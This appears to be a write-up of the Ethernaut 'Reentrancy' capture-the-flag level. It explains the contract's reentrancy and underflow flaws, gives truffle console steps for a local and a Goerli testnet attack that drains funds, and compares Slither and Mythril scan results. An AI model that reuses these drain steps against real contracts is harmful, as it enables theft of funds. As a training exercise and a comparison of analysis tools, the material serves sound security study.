# Reentrancy

[Reentrancy](https://ethernaut.openzeppelin.com/level/0x573eAaf1C1c2521e671534FAA525fAAf0894eCEb)

_Steal all the funds from the contract._


This contract is vulnerable to re-entrancy and has an underflow bug too.  Re-entrancy allows us to call back and over-withdraw. The underflow vulnerability allows us to get away with the attack as the balance underflow does not throw an error.

The solidity version of the vulnerable contract is very important.
From Solidity 0.8.x underflow protection is included. This effectively blocks the attack. 

Specifically the withdraw() line:
```JS
balances[msg.sender] -= _amount;
```

Extra dependency:
```BASH
npm i @openzeppelin/contracts
```

<BR />

## Test Attack

```BASH
truffle develop
```

```JS
migrate

r1 = await Reentrance.deployed()
await r1.donate(accounts[1], {from: accounts[5], value: 12300})

attack = await Attack.deployed()
await attack.donate({value: 10000})
await web3.eth.getBalance(r1.address)
(await r1.balanceOf(accounts[1])).toString()
(await r1.balanceOf(attack.address)).toString()
await attack.withdraw(10000)

await web3.eth.getBalance(attack.address)
await web3.eth.getBalance(r1.address)
```

<BR />

## Live Attack

```BASH
truffle console --network goerli
```

```JS
r1 = await Reentrance.at("0x9C26748d6e0803A3094da1805b1579B7831E628C")
await web3.eth.getBalance(r1.address)

attack = await Attack.deployed()
sender = accounts[5]
await attack.donate({from: sender, value: 1E16})
await attack.withdraw("10000000000000000", {from: sender, gas: 100000})
```

<BR />


## Vulnerability Testing Tools


<BR />

### Slither

__Bug Detect:__ Reentrancy.

__Bug Not Detect:__ Underflow.


```BASH
solc-select use 0.6.12
slither ./contracts/Reentrance.sol  --truffle-ignore-compile  --exclude-optimization 
```

```
Reentrancy in Reentrance.withdraw(uint256) (contracts/Reentrance.sol#19-27):
        External calls:
        - (result) = msg.sender.call{value: _amount}() (contracts/Reentrance.sol#21)
        State variables written after the call(s):
        - balances[msg.sender] -= _amount (contracts/Reentrance.sol#25)
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#reentrancy-vulnerabilities

Low level call in Reentrance.withdraw(uint256) (contracts/Reentrance.sol#19-27):
        - (result) = msg.sender.call{value: _amount}() (contracts/Reentrance.sol#21)
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#low-level-calls

Parameter Reentrance.donate(address)._to (contracts/Reentrance.sol#10) is not in mixedCase
Parameter Reentrance.balanceOf(address)._who (contracts/Reentrance.sol#15) is not in mixedCase
Parameter Reentrance.withdraw(uint256)._amount (contracts/Reentrance.sol#19) is not in mixedCase
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#conformance-to-solidity-naming-conventions

Redundant expression "_amount (contracts/Reentrance.sol#23)" inReentrance (contracts/Reentrance.sol#5-31)
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#redundant-statements
./contracts/Reentrance.sol analyzed (1 contracts with 76 detectors), 6 result(s) found
```

<BR />

### Mythril

__Bug Detect:__ Reentrancy.

__Bug Not Detect:__ Underflow.


```BASH
docker run --rm `
        -v /c/temp/QuickTest/blockchain-ctf/ethernaut/07_Reentrancy:/share `
        mythril/myth `
        analyze /share/contracts/Reentrance.sol `
        --solv 0.6.12
```


```
==== External Call To User-Supplied Address ====
SWC ID: 107
Severity: Low
Contract: Reentrance
Function name: withdraw(uint256)
PC address: 627
Estimated Gas Usage: 7977 - 62921
A call to a user-supplied address is executed.
An external message call to an address specified by the caller is executed. Note that the callee account might contain arbitrary code and could re-enter any function within this contract. Reentering the contract in an intermediate state may lead to unexpected behaviour. Make sure that no state modifications are executed after this call and/or reentrancy guards are in place.
--------------------
In file: /share/contracts/Reentrance.sol:21

msg.sender.call{value:_amount}("")

--------------------
Initial State:

Account: [CREATOR], balance: 0x0, nonce:0, storage:{}
Account: [ATTACKER], balance: 0x0, nonce:0, storage:{}

Transaction Sequence:

Caller: [CREATOR], calldata: , decoded_data: , value: 0x0
Caller: [ATTACKER], function: withdraw(uint256), txdata: 0x2e1a7d4d0000000000000000000000000000000000000000000000000000000000000000, decoded_data: (0,), value: 0x0

==== Unchecked return value from external call. ====
SWC ID: 104
Severity: Medium
Contract: Reentrance
Function name: withdraw(uint256)
PC address: 627
Estimated Gas Usage: 7977 - 62921
The return value of a message call is not checked.
External calls return a boolean value. If the callee halts with an exception, 'false' is returned and execution continues in the caller. The caller should check whether an exception happened and react accordingly to avoid unexpected behavior. For example it is often desirable to wrap external calls in require() so the transaction is reverted if the call fails.
--------------------
In file: /share/contracts/Reentrance.sol:21

msg.sender.call{value:_amount}("")

--------------------
Initial State:

Account: [CREATOR], balance: 0x0, nonce:0, storage:{}
Account: [ATTACKER], balance: 0x0, nonce:0, storage:{}

Transaction Sequence:

Caller: [CREATOR], calldata: , decoded_data: , value: 0x0
Caller: [SOMEGUY], function: withdraw(uint256), txdata: 0x2e1a7d4d0000000000000000000000000000000000000000000000000000000000000000, decoded_data: (0,), value: 0x0
Caller: [ATTACKER], function: withdraw(uint256), txdata: 0x2e1a7d4d0000000000000000000000000000000000000000000000000000000000000000, decoded_data: (0,), value: 0x0

==== Unprotected Ether Withdrawal ====
SWC ID: 105
Severity: High
Contract: Reentrance
Function name: withdraw(uint256)
PC address: 627
Estimated Gas Usage: 7977 - 62921
Any sender can withdraw Ether from the contract account.
Arbitrary senders other than the contract creator can profitably extract Ether from the contract account. Verify the business logic carefully and make sure that appropriate security controls are in place to prevent unexpected loss of funds.
--------------------
In file: /share/contracts/Reentrance.sol:21

msg.sender.call{value:_amount}("")

--------------------
Initial State:

Account: [CREATOR], balance: 0x501c0000000000000, nonce:0, storage:{}
Account: [ATTACKER], balance: 0x0, nonce:0, storage:{}

Transaction Sequence:

Caller: [CREATOR], calldata: , decoded_data: , value: 0x0
Caller: [SOMEGUY], function: donate(address), txdata: 0x00362a95000000000000000000000000deadbeefdeadbeefdeadbeefdeadbeefdeadbeef, decoded_data: ('0xdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef',), value: 0x1
Caller: [ATTACKER], function: withdraw(uint256), txdata: 0x2e1a7d4d0000000000000000000000000000000000000000000000000000000000000001, decoded_data: (1,), value: 0x0

==== State access after external call ====
SWC ID: 107
Severity: Medium
Contract: Reentrance
Function name: withdraw(uint256)
PC address: 752
Estimated Gas Usage: 7977 - 62921
Read of persistent state following external call
The contract account state is accessed after an external call to a user defined address. To prevent reentrancy issues, consider accessing the state only before the call, especially if the callee is untrusted. Alternatively, a reentrancy lock can be used to prevent untrusted callees from re-entering the contract in an intermediate state.
--------------------
In file: /share/contracts/Reentrance.sol:25

balances[msg.sender] -= _amount

--------------------
Initial State:

Account: [CREATOR], balance: 0x0, nonce:0, storage:{}
Account: [ATTACKER], balance: 0x0, nonce:0, storage:{}

Transaction Sequence:

Caller: [CREATOR], calldata: , decoded_data: , value: 0x0
Caller: [ATTACKER], function: withdraw(uint256), txdata: 0x2e1a7d4d0000000000000000000000000000000000000000000000000000000000000000, decoded_data: (0,), value: 0x0

==== State access after external call ====
SWC ID: 107
Severity: Medium
Contract: Reentrance
Function name: withdraw(uint256)
PC address: 759
Estimated Gas Usage: 7977 - 62921
Write to persistent state following external call
The contract account state is accessed after an external call to a user defined address. To prevent reentrancy issues, consider accessing the state only before the call, especially if the callee is untrusted. Alternatively, a reentrancy lock can be used to prevent untrusted callees from re-entering the contract in an intermediate state.
--------------------
In file: /share/contracts/Reentrance.sol:25

balances[msg.sender] -= _amount

--------------------
Initial State:

Account: [CREATOR], balance: 0x0, nonce:0, storage:{}
Account: [ATTACKER], balance: 0x0, nonce:0, storage:{}

Transaction Sequence:

Caller: [CREATOR], calldata: , decoded_data: , value: 0x0
Caller: [ATTACKER], function: withdraw(uint256), txdata: 0x2e1a7d4d0000000000000000000000000000000000000000000000000000000000000000, decoded_data: (0,), value: 0x0
```

